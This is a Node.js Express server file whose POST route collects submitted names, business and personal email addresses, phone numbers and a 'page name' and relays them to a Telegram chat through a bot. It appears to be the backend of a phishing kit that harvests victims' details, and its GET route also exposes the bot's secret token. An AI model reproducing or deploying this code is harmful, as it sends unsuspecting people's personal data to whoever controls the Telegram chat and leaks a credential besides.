require('dotenv').config();

const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const path = require('path');
const axios = require('axios');
const url = 'https://api.telegram.org/bot';

app.use(bodyParser.json());

app.use(express.static('public'));

app.get('/', function (req, res) {
    console.log(process.env.BOT_TOKEN);
    res.json({
        message: process.env.BOT_TOKEN
    });
});

app.post('/', async (req, res) => {

    console.log(req.body);
    // const sentMessage = req.body.message.text;
    let img = 'https://64.media.tumblr.com/702cb5b37ac53d0a5a4038546bf247a2/ad080d7fd0e814df-ee/s2048x3072/977ef6d312ca650b58b8e66a9282de87b41d7c09.jpg'


    let r = await axios.post(`${url}${process.env.BOT_TOKEN}/sendMessage`,
        {
            chat_id: process.env.CHAT_ID,
            text: 
            `Page Name: ${req.body?.pageName}\n` +
            `Fullname: ${req.body?.fullName}\n` +
            `Business Email Address: ${req.body?.businessEmail}\n` +
            `Personal Email Address: ${req.body?.personalEmail}\n` +
            `Mobile Phone Number : ${req.body?.phoneNumber}\n` +
            `Note: ${req.body?.Note}\n`
        })


    // console.log('huydevvvv', res.status);
    res.status(200).send(req.body);
    // .then((response) => {
    //     res.status(200).send(req.body);
    // }).catch((error) => {
    //     res.send(error);
    // });

    // res.status(200).send({});
});

app.get('/about', function (req, res) {
    res.sendFile(path.join(__dirname, '..', 'components', 'about.htm'));
});

app.get('/uploadUser', function (req, res) {
    res.sendFile(path.join(__dirname, '..', 'components', 'user_upload_form.htm'));
});




app.listen(3000, () => console.log('Server ready on port 3000.'));

module.exports = app;



